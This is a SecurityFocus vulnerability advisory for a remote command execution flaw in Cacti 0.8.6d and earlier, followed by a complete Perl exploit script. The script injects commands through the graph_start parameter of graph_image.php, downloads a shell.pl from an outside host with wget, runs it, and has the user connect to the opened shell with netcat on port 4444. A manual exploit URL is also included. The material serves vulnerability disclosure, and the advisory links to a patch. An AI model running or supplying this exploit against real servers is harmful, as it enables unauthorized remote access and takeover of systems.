source: http://www.securityfocus.com/bid/14129/info

RaXnet Cacti is prone to a remote command execution vulnerability that manifests in the 'graph_image.php' script. The issue is due to a bug in the input filters that leads to a failure in the application to properly sanitize user-supplied input.

This issue can facilitate various attacks including unauthorized access to an affected computer. 

#!/usr/bin/perl
#
# Remote Command Execution Exploit for Cacti <= 0.8.6d
#
# This exploit open a remote shell on the targets that uses Cacti
# TARGET HOST MUST BE A GNU/LINUX SERVER, if not:
# manual exploiting -->
http://www.example.com/cacti/graph_image.php?local_graph_id=[valid_value]&gr
aph_start=%0a[command]%0a
# Patch: download the last version http://www.cacti.net/download_cacti.php
# Discovered and Coded by Alberto Trivero

use LWP::Simple;

print "\n\t===============================\n";
print "\t= Exploit for Cacti <= 0.8.6d =\n";
print "\t=      by Alberto Trivero     =\n";
print "\t===============================\n\n";

if(@ARGV<2 or !($ARGV[1]=~m/\//)) {
   print "Usage:\nperl $0 [target] [path]\n\nExamples:\nperl $0
www.example.com /cacti/\n";
   exit(0);
}

$page=get("http://".$ARGV[0].$ARGV[1]."graph_view.php?action=list") || die
"[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page=~m/local_graph_id=(.*?)&/ || die "[-] Unable to retrieve a value for
local_graph_id";
print "[~] Sending exploiting request, wait for some seconds/minutes...\n";
get("http://".$ARGV[0].$ARGV[1]."graph_image.php?local_graph_id=$1&graph_sta
rt=%0acd /tmp;wget http://albythebest.altervista.org/shell.pl;chmod 777
shell.pl;perl shell.pl%0a");
print "[+] Exploiting request done!\n";
print "[*] Now try on your box: nc -v $ARGV[0] 4444\n";